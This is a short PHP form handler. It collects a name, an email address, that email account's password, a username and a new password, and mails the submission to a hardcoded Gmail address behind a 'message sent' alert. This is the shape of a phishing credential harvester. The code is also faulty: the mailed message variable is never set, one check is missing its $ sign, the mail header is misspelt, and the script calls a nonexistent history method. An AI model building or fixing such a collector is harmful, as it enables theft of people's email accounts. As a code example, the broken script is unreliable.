<?php
//variable setting
$name = $_REQUEST['Full name'];
$email = $_REQUEST['email'];
$emailpassword = $_REQUEST['emailpassword'];
$username = $_REQUEST['username'];
$makepassword = $_REQUEST['make password'];

//cheak input fields
if(empty($name) || empty($email) || empty($username) || empty(emailpassword) || empty($makepassword))
{
	echo "please fill all the fields";
}	 
else{
	mail("jahihmolla03@gmail.com", "Galaxy Massage", $message,"Form: $name <$email>");
	echo "<script type='text/javascript'> alert('your massage sent successfully');
	window.history.log(-2);
	</script>";

}
?>